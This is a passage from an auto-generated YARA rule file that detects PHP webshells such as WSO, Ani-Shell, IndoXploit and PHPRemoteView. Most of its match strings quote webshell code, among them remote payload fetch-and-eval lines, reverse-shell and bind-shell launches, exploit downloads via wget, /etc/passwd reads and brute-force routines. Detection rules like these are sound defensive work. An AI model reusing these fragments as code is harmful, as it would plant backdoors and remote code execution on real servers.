      $s13 = "chkpassword" fullword ascii
      $s14 = "@mysql_connect(\"{$sqlhost}:{$sqlport}\",\"$sqluser\",\"$sqlpasd\") or die(\"" fullword ascii
      $s15 = "$out = ($tp==1)?@get_cfg_var($getname):(($tp==2)?@function_exists($getname):(($tp==3)?@get_magic_quotes_gpc($getname):(($tp==4)?" ascii
      $s16 = "\\\" target=\\\"_blank\\\">$lop_fname</a></td>\"." fullword ascii
      $s17 = "@get_magic_quotes_runtime($getname):(($tp==5)?@Getenv($getname):\"error!\"))));" fullword ascii
      $s18 = "<option value=\"shell_exec\" <?=($seletefunc==\"shell_exec\")?\"selected\":\"\";?>>shell_exec</option>" fullword ascii
      $s19 = "if ($_GET[\"action\"] == \"logout\") {" fullword ascii
      $s20 = ":<input name=\"shellcmd\" type=\"text\" class=\"style1\" value=\"<?=isset($shellcmd)?$shellcmd:\"\"?>\" size=\"80\">" fullword ascii
   condition:
      uint16(0) == 0x3c0a and filesize < 80KB and
      8 of them
}

rule webshell_php_2013_1 {
   meta:
      description = "webshell - file 2013.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "106c686e2688535d2ff747203fdec675096fc9287655f833485520ae5e8365bb"
   strings:
      $x1 = "<a href=\"javascript:g('shell',null,'','','','','<?php echo $charset;?>');\">Execute Command</a> | " fullword ascii
      $s2 = "$res = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c');" fullword ascii
      $s3 = "formhead(array('title'=>'Execute Command', 'onsubmit'=>'g(\\'shell\\',null,this.p1.value);return false;'));" fullword ascii
      $s4 = "secparam('IP Configurate',execute('ipconfig -all'));" fullword ascii
      $s5 = "secparam('Downloaders', implode(', ',$temp));" fullword ascii
      $s6 = "$res = execute(which('perl').\" /tmp/angel_bc \".$p2.\" \".$p3.\" &\");" fullword ascii
      $s7 = "$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');" fullword ascii
      $s8 = "scookie('loginpass', '', -86400 * 365);" fullword ascii
      $s9 = "secparam('HDD space', execute('df -h'));" fullword ascii
      $s10 = "p('<pre>'.execute($p1).'</pre>');" fullword ascii
      $s11 = " 2013 final</a>. Copyright (C) 2004-2013 <a href=\"http://www.4ngel.net\" target=\"_blank\">[S4T]</a> All Rights Reserved." fullword ascii
      $s12 = "Powered by <a title=\"Build 20130112\" href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p." ascii
      $s13 = "secparam('OS Version',execute('ver'));" fullword ascii
      $s14 = "secparam('User Accounts',execute('net user'));" fullword ascii
      $s15 = "secparam('Account Settings',execute('net accounts'));" fullword ascii
      $s16 = "$res = execute(\"/tmp/angel_bc \".$p2.\" \".$p3.\" &\");" fullword ascii
      $s17 = "<td><span style=\"float:right;\"><?php echo @php_uname();?> / User:<?php echo $uid.' ( '.$user.' ) / Group: '.$gid.' ( '.$group." ascii
      $s18 = "p('<p><a href=\"http://w'.'ww.4'.'ng'.'el.net/php'.'sp'.'y/pl'.'ugin/\" target=\"_blank\">Get plugins</a></p>');" fullword ascii
      $s19 = "<td width=\"100%\"><?php echo $cwd_links.' - '.getChmod($cwd).' / '.PermsColor($cwd).getUser($cwd);?> (<?php echo $dir_writeable" ascii
      $s20 = "<title><?php echo $act.' - '.$_SERVER['HTTP_HOST'];?></title>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule webshell_php_404 {
   meta:
      description = "webshell - file 404.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "f46dc0482a25e972f5547bc72766e45d7a7abd4874b6792754734ecd35f9cc38"
   strings:
      $s1 = "<address>Apache Server at \".$_SERVER[\"HTTP_HOST\"].\" Port 80 </address>" fullword ascii
      $s2 = "$chk_login = 1;" fullword ascii
      $s3 = "zwDWzY6U91Mo9rXwxumlPU6nTrd6Z1KmtNS9FeYAUt6lNapOW0ZAE8bBZKRmlrf7dSePg6NxSuuNybnh6Md4pKTeV0zvuQcjVdFG7FfrKVsbIn5x2WyVluF0xuxe5q+6" ascii
      $s4 = "$password = \"8f841a9b44b0167db6056389e0106af4\";" fullword ascii
      $s5 = "if(!isset($_SESSION['ses']) or $_SESSION['ses'] != $password)" fullword ascii
      $s6 = "$psw = trim($_POST['pass']);" fullword ascii
      $s7 = "<input type=password name=pass>" fullword ascii
      $s8 = "if($chk_login)" fullword ascii
      $s9 = "if($pass == $password)" fullword ascii
      $s10 = "7P24N/GhOfjjzSDrUE42/l7qwMl/1NIWNhcsX+ARJZRfVFAwGfZLHjPokgSrkx2Dmwk5cfIxg4MgUg51hWDNDue8pkIUxfQuP61tRJhfYfekFW9nvvfA65iA+lupX/kl" ascii
      $s11 = "XZD5Gsu76mpmFeCo5M9skmlBc8jRUKPpaela7OPVe/A4GjVsXNLVv7IqI24gOmali2rBgoYX5JEwasDCR0THIew4X2QaR1s/Xb7njXZVPYAbqeEuEDLQMHcIubCtc1VU" ascii
      $s12 = "4ASCxqGL5NS3sSsPUS/XCNKow5JB8P5whaBBjjV6AiSONkkGuvcdY/F+zyFIEtLhnmNTF5tNjWsH4FaBhR7FgDY6nfUlcgSTZ4oifrjIDZ2SvOpitMjGwF+xpzMR7Zqa" ascii
      $s13 = "Yd6eWvMsJlqWpouCqppEyRVd21x3XlgWdjymhyUbfVXY5Polg0AtB/bQaAyqpjmU6KqBFNFxXEBUdpRc4KGEIurz/geeTXcHBL7SOSf4DXwDCsqiYtE3oZaKicl9zsub" ascii
      $s14 = "BAULiUh0ClxYKlYh/AhRbiDaYiTAOJYH+/0QNx3wck642TFsXtBBuJZtgX8BmxTCRMaZbkc6g/IVO8pofZ9hYQ0g4RH2gZ2SJpi8cC3wgzN7nWBD0D7bAmmrI61T4s56" ascii
      $s15 = "Y1gfBaNldC8riz8VXj8gnbMjS+ACcbIhEV/Wh5qqWYLtYm9bh6PIZUxh/qoR3Dhj3gPlnTH/4Z3/0dyQ8QfRsKQTmH9fFzPP4yMFGONyIZ4Ywi6jVIc++5QrbKQIS6H3" ascii
      $s16 = "63lW31MeBZBwLdqVyczscbHHDS7clDXXHTh+XNx43bfvpQu21t51y7q5zrT+unbW1trBZ7109tATj7vaqvnbdw/6KrPBb2j5/d3eitHZq40pNSA1Spd7DQOs3s0Jp7aC" ascii
      $s17 = "9aFydioel1InrVDbPD/V85fpo7VwRq48D6yZ9rE+Ouo/dgXTQOtck4bjhXJ9xd7J5KNeb1YORJffKvRulh2Sn3xqMTtYe3FO1sT06M5Xb0/JjM3unnzceNu42+1d3vaZ" ascii
      $s18 = "HGYQi1EgogUcgNEq6fpPBVCQtxULQv/nVn/78r379y/+HV1R/wAWFH4SR4IhoIuPuusOBYK8sEwrLCfpwD7q8DMbKR/LL3xAWkvnm8/aXqTjGxtg6R9a7Q2OqzlrpdMG" ascii
      $s19 = "olOyoT6hCUnKpB/DyxEWZ8sTSgLVLvQSf5IN0+PNeNIcGqhJ6XF3PIITv4sWUTwKl97yu6jIPdQngEHfkdegs29R2OWvYRd3BsxCViaXasgNIJMGVV3ibT+gDVF95JZ2" ascii
      $s20 = "oXZQu0mnhdnIidLZ0YfLYbZ5NLg5PD9WbiXp2O+jkTo/qVir3pNUtc3tSu93O5x5GPW6tp+2cNq9GaIFTbmQvWmbP3rRyXXtH6ejKzXjr4Cqv35Z2NP2hvnF9Mz3Mm80" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 40KB and
      8 of them
}

rule webshell_php_wso {
   meta:
      description = "webshell - file wso.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "ef740d974b11cf6c8da3d4e81785236e4f6ba1d5b0b7a89787955963bcba5f6d"
   strings:
      $x1 = " '<td><nobr>'.substr(@php_uname(), 0, 120).'  <a href=\"http://www.google.com/search?q='.urlencode(@php_uname()).'\" target=\"_b" ascii
      $s2 = " '<td><nobr>'.substr(@php_uname(), 0, 120).'  <a href=\"http://www.google.com/search?q='.urlencode(@php_uname()).'\" target=\"_b" ascii
      $s3 = "showSecParam('Downloaders', implode(', ',$temp));" fullword ascii
      $s4 = "<html><head><meta http-equiv='Content-Type' content='text/html; charset=<?=$_POST['charset']?>'><title><?=$_SERVER['HTTP_HOST']?" ascii
      $s5 = "$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');" fullword ascii
      $s6 = "if( bruteForce($server[0],@$server[1], $_POST['login'], $line) ) {" fullword ascii
      $s7 = "echo \"<br><textarea name='p3' style='width:100%;height:100px'>\".@htmlspecialchars($_POST['p3']).\"</textarea><br/><input type=" ascii
      $s8 = "$str = \"host='\".$ip.\"' port='\".$port.\"' user='\".$login.\"' password='\".$pass.\"' dbname=''\";" fullword ascii
      $s9 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit=\"if(this.ajax.checked){a(null,null,this." ascii
      $s10 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit=\"if(this.ajax.checked){a(null,null,this." ascii
      $s11 = "pe=submit value=\">>\"></form><br><span>Posix_getpwuid (\"Read\" /etc/passwd)</span><table><form onsubmit=\\'g(null,null,\"5\",t" ascii
      $s12 = "header(\"Content-Disposition: attachment; filename=dump.sql\");" fullword ascii
      $s13 = "<input type=\"button\" value=\"fakenamegenerator.com\" onclick=\"document.hf.action='http://www.fakenamegenerator.com/';document" ascii
      $s14 = "$millink='https://github.com/HARDLINUX/webshell/search?utf8=" fullword ascii
      $s15 = "<input type=\"button\" value=\"fakenamegenerator.com\" onclick=\"document.hf.action='http://www.fakenamegenerator.com/';document" ascii
      $s16 = "echo @file_get_contents($temp);" fullword ascii
      $s17 = "function bruteForce($ip,$port,$login,$pass) {" fullword ascii
      $s18 = "k\">[Google]</a> <a href=\"'.$millink.'\" target=_blank>[Exploit-Git]</a></nobr><br>'.$uid.' ( '.$user.' ) <span>Group:</span> '" ascii
      $s19 = "echo \"<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\\\"download\\\";do" ascii
      $s20 = "$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule Ani_Shell {
   meta:
      description = "webshell - file Ani-Shell.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9476a89065f61d65f093098e59444d605012872ade480bd02235cc545618231c"
   strings:
      $s1 = "// Script Encoded by Ani-Shell " fullword ascii
      $s2 = "// exec_all , A function used to execute commands , This function will only execute if the Safe Mode is" fullword ascii
      $s3 = "= \"lionaneesh@gmail.com\"; // Change this to your email , This email is used to deliver tracebacks about your shell" fullword ascii
      $s4 = "        $encoded = base64_encode(gzdeflate(trim(stripslashes($_POST['code'].' '),'<?php,?>'),9)); // high Compression! :P" fullword ascii
      $s5 = "        $output = shell_exec($command);" fullword ascii
      $s6 = "function exec_all($command)" fullword ascii
      $s7 = "    <!-- For Shell -->" fullword ascii
      $s8 = "tim@domain.com,victim2@domain.com')this.value = '';\" onblur=\"if(this.value=='')this.value='victim@domain.com,victim2@domain.co" ascii
      $s9 = "        $passwordPrompt = \"\\n=================================================================\\nAni-Shell | C0d3d by lionanee" ascii
      $s10 = "        $passwordPrompt = \"\\n=================================================================\\nAni-Shell | C0d3d by lionanee" ascii
      $s11 = "else if(isset($_GET['injector']))" fullword ascii
      $s12 = "function exec_query_mysql($query,$sql_server,$sql_port,$sql_db,$sql_user,$sql_pass)" fullword ascii
      $s13 = "--Some Garbage here --%x%S')this.value = '';\" onblur=\"if(this.value=='')this.value='%S%x--Some Garbage here --%x%S';\"/>" fullword ascii
      $s14 = "        $result=exec_all($_GET['cmd']);" fullword ascii
      $s15 = "        /* Accept incoming requests and handle them as child processes */" fullword ascii
      $s16 = "        <form action=\"http://google.com\" method=\"GET\">" fullword ascii
      $s17 = "(: <a href=\"http://twitter.com/lionaneesh\">Follow Me</a> | <a href=\"http://facebook.com/lionaneesh\">Facebook</a> :) <br />" fullword ascii
      $s18 = "if(isset($_GET['logout']) && $lock == 'on')" fullword ascii
      $s19 = "// ------------------------------------- Some header Functions (Need to be on top) ---------------------------------\\" fullword ascii
      $s20 = "$encoded = \\''.$encoded.'\\';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule webshell_php_newsh {
   meta:
      description = "webshell - file newsh.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "60a4730f359762d973d9cfc00093cdbddaa2ce4ca4c4e113a57c73e44353d93c"
   strings:
      $s1 = "  <div align=\"center\"><a class=\"link\" href=\"javascript:document.folder.dir.value='<?=addslashes(realpath(\".\"))?>';documen" ascii
      $s2 = "$dump .= \"# MySQL version: (\".@mysql_get_server_info().\") running on \".getenv(\"SERVER_ADDR\").\" (\".getenv(\"SERVER_NAME\"" ascii
      $s3 = "fputs($url,\"GET /$file HTTP/1.0\\r\\nAccept-Encoding: text\\r\\nHost: $host\\r\\nReferer: $host\\r\\nUser-Agent: Mozilla/5.0 " fullword ascii
      $s4 = "  x.src = \"<?=base64_decode($images[url]).getenv(\"HTTP_HOST\").$_SERVER['PHP_SELF']?>\";" fullword ascii
      $s5 = "shell_exec(stripslashes($_POST['cmd']));" fullword ascii
      $s6 = "</form><form action=# method=post><input type=hidden name=mode value=dump_db><input name=dbname type=text value=\"'.$_COOKIE[mys" ascii
      $s7 = " <br>urldecode - <input type=text size=35 onFocus=\\\"this.select()\\\" onMouseover=\\\"this.select()\\\" onMouseout=\\\"this.se" ascii
      $s8 = "</form><form action=# method=post><input type=hidden name=mode value=dump_db><input name=dbname type=text value=\"'.$_COOKIE[mys" ascii
      $s9 = " <br></center><b>Base64:</b><center>base64_encode - <input type=text size=35 onFocus=\\\"this.select()\\\" onMouseover=\\\"this." ascii
      $s10 = "()\\\" onMouseout=\\\"this.select()\\\" value=\\\"\".base64_encode($_POST[plain]).\"\\\" readonly></center><center>base64_decode" ascii
      $s11 = "exec(stripslashes($_POST['cmd']));" fullword ascii
      $s12 = "$file_name = $db.\"_dump_\".date(\"d_M_Y\").\"_Nexpl0rer.\".sql;" fullword ascii
      $s13 = "      <div align=\"center\"><strong>:: Cmd Execution ::  </strong><br>" fullword ascii
      $s14 = "ef=\"javascript:document.tools.nometool.value='scanner';document.tools.submit();\">ShellScan</a> - <a class=\"link\" href=\"java" ascii
      $s15 = ".crc32($_POST[plain]).\"\\\" readonly><br></center><b>Url:</b><center><br>urlencode - <input type=text size=35 onFocus=\\\"this." ascii
      $s16 = "// executing command THX TO R57" fullword ascii
      $s17 = " <center>dec2hex - <input type=text size=35 onFocus=\\\"this.select()\\\" onMouseover=\\\"this.select()\\\" onMouseout=\\\"this." ascii
      $s18 = " <br>sha1 - <input type=text size=50 onFocus=\\\"this.select()\\\" onMouseover=\\\"this.select()\\\" onMouseout=\\\"this.select(" ascii
      $s19 = "$link = mysql_connect($_POST['host'], $_POST['user'], $_POST['pass'])or die(mysql_error());" fullword ascii
      $s20 = " crc32 - <input type=text size=50 onFocus=\\\"this.select()\\\" onMouseover=\\\"this.select()\\\" onMouseout=\\\"this.select()" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule qyt0dHv1 {
   meta:
      description = "webshell - file qyt0dHv1.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9507cfcb16c1a7f91c2ec0b93393615e85fb7834c10c58c2f351f0c69bdee285"
   strings:
      $x1 = "</form>Copyright &copy; \".date(\"Y\").\" - <a href='http://forum.indoxploit.or.id/' target='_blank'><font color=lime>IndoXploit" ascii
      $x2 = "nt></a> Shell Recoded By <a href='http://zroot.ml' target='_BLANK'><font color=lime>cor0.id</a></font></center>\";" fullword ascii
      $x3 = "$cgi_script = file_get_contents(\"http://pastebin.com/raw.php?i=XTUFfJLg\");" fullword ascii
      $s4 = "$cek_login3 = file_get_contents(\"$target2/adminweb/\");" fullword ascii
      $s5 = "curl_setopt($curl, CURLOPT_USERAGENT, \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0." ascii
      $s6 = "$cek_login = file_get_contents(\"$target/adminweb/\");" fullword ascii
      $s7 = "$cek_login2 = file_get_contents(\"$target/lokomedia/adminweb/\");" fullword ascii
      $s8 = "$cek_login4 = file_get_contents(\"$target2/lokomedia/adminweb/\");" fullword ascii
      $s9 = "    echo '<center>Cor0 Shell<hr><font color=\"white\" >IndoXploit Shell Recoded By cor0.id<br>GReeTzz:<br><font color=\"blue\" >" ascii
      $s10 = "<textarea name='link' placeholder='http://target.com/idx_config/user-config.txt' style='width: 450px; height:250px;'></textarea>" ascii
      $s11 = "<textarea name='link' placeholder='http://target.com/idx_config/user-config.txt' style='width: 450px; height:250px;'></textarea>" ascii
      $s12 = "</form>Copyright &copy; \".date(\"Y\").\" - <a href='http://forum.indoxploit.or.id/' target='_blank'><font color=lime>IndoXploit" ascii
      $s13 = "echo \"URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=lime>Fake Root!</font><br>\";" fullword ascii
      $s14 = "eval(gzinflate(base64_decode(file_get_contents('http://pastebin.com/raw/6PJ9Pj8F'))));" fullword ascii
      $s15 = "<textarea name='edit_content' placeholder='contoh script: http://pastebin.com/EpP671gK' style='width: 450px; height: 150px;'></t" ascii
      $s16 = "$url_target = \"Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>\";" fullword ascii
      $s17 = "$url_target2 = \"Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>\";" fullword ascii
      $s18 = "echo \"<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>\";" fullword ascii
      $s19 = "$site = \"$target/wp-login.php\";" fullword ascii
      $s20 = "<textarea name='edit_content' placeholder='contoh script: http://pastebin.com/EpP671gK' style='width: 450px; height: 150px;'></t" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 700KB and
      1 of ($x*) and 4 of them
}

rule v4xGus6X {
   meta:
      description = "webshell - file v4xGus6X.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "f81558fca974375a5e6512dece2d3d3a0d854390223511c609ed61a104f9e2fa"
   strings:
      $x1 = "--==Coded By Arjun==--</font><br><a href=\"http://www.google.com/search?q=%E0%A4%9C%E0%A4%AF%20%E0%A4%B9%E0%A4%BF%E0%A4%A8%E0%A5" ascii
      $x2 = "header(\"Location:http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=Linux+Kernel+$Lversion\");" fullword ascii
      $x3 = "--==Coded By Arjun==--</font><br><a href=\"http://www.google.com/search?q=%E0%A4%9C%E0%A4%AF%20%E0%A4%B9%E0%A4%BF%E0%A4%A8%E0%A5" ascii
      $s4 = "ajaxRequest.open(\"GET\", \"<?php echo $_SERVER[\"PHP_SELF\"]; ?>?executeit&server=\"+server+\"&username=\"+username+\"&password" ascii
      $s5 = "ajaxRequest.open(\"GET\", \"<?php echo $_SERVER[\"PHP_SELF\"]; ?>?executeit&server=\"+server+\"&username=\"+username+\"&password" ascii
      $s6 = "<font class=\"txt\">Dhanush Shell is a PHP Script, created for checking the vulnerability and security of any web server or webs" ascii
      $s7 = "$BASED = exif_read_data(\"https://lh3.googleusercontent.com/-svRm4i5Bs90/VsFaosQPKUI/AAAAAAAABew/03oHWkCEsN8/w140-h140-p/pacman." ascii
      $s8 = "$BASED = exif_read_data(\"https://lh3.googleusercontent.com/-svRm4i5Bs90/VsFaosQPKUI/AAAAAAAABew/03oHWkCEsN8/w140-h140-p/pacman." ascii
      $s9 = "execmd(\"gcc -o \".getcwd().\"/backp \".getcwd().\"/backp.c\");" fullword ascii
      $s10 = "execmd(\"perl \".getcwd().\"/bc.pl $host $port  &\",$disable);" fullword ascii
      $s11 = "header(\"Location:http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=$OSV+Lversion\");" fullword ascii
      $s12 = " execmd(\"python \".getcwd().\"/bc.py $host $port  &\",$disable);" fullword ascii
      $s13 = "header(\"Location:http://exploitsearch.com/search.html?cx=000255850439926950150%3A_vswux9nmz0&cof=FORID%3A10&q=Linux+Kernel+$Lve" ascii
      $s14 = "header(\"Location:http://exploitsearch.com/search.html?cx=000255850439926950150%3A_vswux9nmz0&cof=FORID%3A10&q=Linux+Kernel+$Lve" ascii
      $s15 = "header(\"Location:http://www.shodanhq.com/exploits?q=Linux+Kernel+$Lversion\");" fullword ascii
      $s16 = "execmd(\"perl /tmp/bc.pl $host $port  &\",$disable);" fullword ascii
      $s17 = " execmd(\"python /tmp/bc.py $host $port  &\",$disable);" fullword ascii
      $s18 = "ajaxRequest.open(\"GET\", \"<?php echo $_SERVER[\"PHP_SELF\"]; ?>?prototype=\"+prototype+\"&serverport=\"+serverport+\"&login=\"" ascii
      $s19 = "myparam('Downloaders', implode(', ',$temp));" fullword ascii
      $s20 = "execmd(\"ln -s /etc/passwd\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 700KB and
      1 of ($x*) and 4 of them
}

rule aioshell {
   meta:
      description = "webshell - file aioshell.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9211e746ea45d8531d92fa01889b750187deeb41d5400dbd572b6474a1342803"
   strings:
      $s1 = "run_proxy_client($_POST['intranet_host'], $_POST['intranet_port']," fullword ascii
      $s2 = "exec_shell($_POST['shellcmd']);" fullword ascii
      $s3 = "target host" fullword ascii
      $s4 = "                connect_backdoor($_POST['target_host'], $_POST['target_port']);" fullword ascii
      $s5 = "bindshell($_POST['bind_port']);" fullword ascii
      $s6 = "empty($_POST['public_host']) ||  empty($_POST['public_port']))" fullword ascii
      $s7 = "$_POST['public_host'], $_POST['public_port']);" fullword ascii
      $s8 = "        if ($_POST['target_host'] && $_POST['target_port']) {" fullword ascii
      $s9 = "<td><a href=\"webshell.php?cmd=backdoor\">connect backdoor</a></td>" fullword ascii
      $s10 = "<td><a href=\"webshell.php?cmd=portscan\">port scan</a></td>" fullword ascii
      $s11 = "<li><a href=\"webshell.php?cmd=backdoor\">[Backdoor]</a></li>" fullword ascii
      $s12 = "<li><a href=\"webshell.php?cmd=portscan\">[PortScan]</a></li>" fullword ascii
      $s13 = "if ($_GET['cmd'] == \"portscan\") {" fullword ascii
      $s14 = "<input style=\"border:none\" color=\"#384850\" type=\"submit\" value=\"Execute\" /><br /><br />" fullword ascii
      $s15 = "<li><a href=\"webshell.php?cmd=proxy\">[Proxy]</a></li>" fullword ascii
      $s16 = "function run_proxy_core($socket1, $remote_host1, $socket2, $remote_host2)" fullword ascii
      $s17 = "if ($_GET['cmd'] == \"backdoor\") {" fullword ascii
      $s18 = "<td><a href=\"webshell.php?cmd=proxy\">reverse proxy</a></td>" fullword ascii
      $s19 = "<td><a href=\"webshell.php?cmd=shell\">cmd shell</a></td>" fullword ascii
      $s20 = "function run_proxy_client($remote_host1, $remote_port1, $remote_host2, $remote_port2)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      8 of them
}

rule PHPRemoteView {
   meta:
      description = "webshell - file PHPRemoteView.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "61e9ad4eb0d37d3f4e39cf0d8a32c1e6964bb45c615b83f1e6c4a56066435689"
   strings:
      $x1 = " *  - executing any shell commands and any PHP-code" fullword ascii
      $s2 = "   $system_access=true;     // true - user (you) may be run shell commands" fullword ascii
      $s3 = "      exit(\"<h1><a href=http://php.spb.ru/remview/>phpRemoteView</a>: Access Denied - password erroneous</h1>\\n\");" fullword ascii
      $s4 = " *  2002.01.20 add panel 'TOOLS': eval php-code and run shell commands" fullword ascii
      $s5 = " *  - view index of directory (/var/log - view logs, /tmp - view PHP sessions)" fullword ascii
      $s6 = "\"Shell commands\"=>\"" fullword ascii
      $s7 = "      exit(\"<h1><a href=http://php.spb.ru/remview/>phpRemoteView</a>: Access Denied - your host not allow</h1>\\n\");" fullword ascii
      $s8 = " *  Free download from http://php.spb.ru/remview/" fullword ascii
      $s9 = "   $phpeval_access=true;    // true - user (you) may be execute any php-code" fullword ascii
      $s10 = " *             add panel 'TOOLS': eval php-code and run shell commands" fullword ascii
      $s11 = "   \".mm(\"Free download\").\" - <a href='http://php.spb.ru/remview/'>http://php.spb.ru/remview/</a></b></font></td>" fullword ascii
      $s12 = " *  - download any file and open on Notepad" fullword ascii
      $s13 = "   echo \"Temp file: \".$HTTP_POST_FILES['userfile']['tmp_name'].\"<br>\";" fullword ascii
      $s14 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC" ascii /* base64 encoded string '                                            ' */
      $s15 = "   if ($login!==false && (!isset($HTTP_SERVER_VARS['PHP_AUTH_USER']) || " fullword ascii
      $s16 = "   echo \"<P><b>\".mm(\"Shell commands\").\"</b>" fullword ascii
      $s17 = " *  2003.04.22 read first 64Kb of null-size file (example: /etc/zero), " fullword ascii
      $s18 = " * --version4--" fullword ascii
      $s19 = "\"FILE SYSTEM COMMANDS\"=>\"" fullword ascii
      $s20 = " * --version2--" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule NetworkFileManagerPHP {
   meta:
      description = "webshell - file NetworkFileManagerPHP.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "0863907cbabc1679e00a99f84c5adc3ff4daab11aa0df970e37f051c770d31ed"
   strings:
      $x1 = "<dd><b>Compilation, installing and running psybnc:</b> make // making psybnc // ./psybnc // You may edit psybnc.conf with NFM, D" ascii
      $x2 = " <tr><td> <font color='#FFFFCC' face='Tahoma' size = 2>Directory <u><b>$fullpath</b></u>  \".exec(\"tar -zc $fullpath -f $pass.t" ascii
      $x3 = "<tr><td bgcolor=#FFFFCC><br>Current shell binds 4000 port, you may access to it by telneting to host:4000 port without password." ascii
      $x4 = "<tr><td bgcolor=#FFFFCC><br>Current shell binds 4000 port, you may access to it by telneting to host:4000 port without password." ascii
      $s5 = " <tr><td> <font color='#FFFFCC' face='Tahoma' size = 2>Directory <u><b>$fullpath</b></u>  \".exec(\"tar -zc $fullpath -f $pass.t" ascii
      $s6 = "echo \"<tr><td align=center bgcolor=#FFFFCC><b>&nbsp; \".exec(\"wget http://hackru.info/adm/exploits/bash/s\").\"</b> Downloadin" ascii
      $s7 = "ht=black bordercolordark=white><tr><td align=center class=pagetitle><b>Connected with login:password - \".$g[1].\":\".$g[1].\"</" ascii
      $s8 = "&nbsp;&nbsp;bindtty.c - remote shell on 4000 port, with rights of current user (id of apache)<br>" fullword ascii
      $s9 = "echo \"<tr><td align=center bgcolor=#FFFFCC><b>&nbsp; \".exec(\"wget http://hackru.info/adm/exploits/bash/s\").\"</b> Downloadin" ascii
      $s10 = "efault listening port is 31337 - connect to it with your favotite IRC client and set a password<br>" fullword ascii
      $s11 = "&nbsp;&nbsp;lGlftpd DupeScan Local Exploit - private local root exploits for Glftpd daemon <br>" fullword ascii
      $s12 = " &nbsp;&nbsp;<b>Glftpd DupeScan Local Exploit <u>File 2</u></b> (binary file to run - <u>$private[3]</u> )</td></tr>" fullword ascii
      $s13 = " &nbsp;&nbsp;<b>Glftpd DupeScan Local Exploit <u>File 1</u></b> (binary file to run - <u>$private[2]</u> )</td></tr>" fullword ascii
      $s14 = "if ($action !=\"download\" && $action != \"down\" && $action != \"spam\" && $action != \"brut_ftp\" && $action != \"download_mai" ascii
      $s15 = " &nbsp;&nbsp;<b>FTP bruteforce</b>(full bruteforce, you are only to enter a value of number of passwords and brute will begin fr" ascii
      $s16 = "       fputs($f,\"Enter on ftp:\\nFTPhosting:\\t$host\\nLogin:\\t$login\\nPassword:\\t$password\\n \");" fullword ascii
      $s17 = "if ($action !=\"download\" && $action != \"down\" && $action != \"spam\" && $action != \"brut_ftp\" && $action != \"download_mai" ascii
      $s18 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87" ascii
      $s19 = "ts[a].checked=false;i=i+1;} } </script><center><br><b>Choose tables you need to dump!</b><form action='' method='post' name=form" ascii
      $s20 = "  echo $header.\"<script language='javascript'> function checkall() { var i=0;while (i < $nb_tbl) { a='tbls['+i+']';document.for" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule webshell_php_Dx {
   meta:
      description = "webshell - file Dx.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "36f50344183b4bc8b44e64143915ba2c02b9fbf239ce07b8925f849268ee5b3b"
   strings:
      $x1 = "$DEF_PORTS=array (1=>'tcpmux (TCP Port Service Multiplexer)',2=>'Management Utility',3=>'Compression Process',5=>'rje (Remote Jo" ascii
      $x2 = "foreach ($DUMP[0] as $key => $val) $DxDOWNLOAD_File['content'].=$key.\";\"; /* headers */" fullword ascii
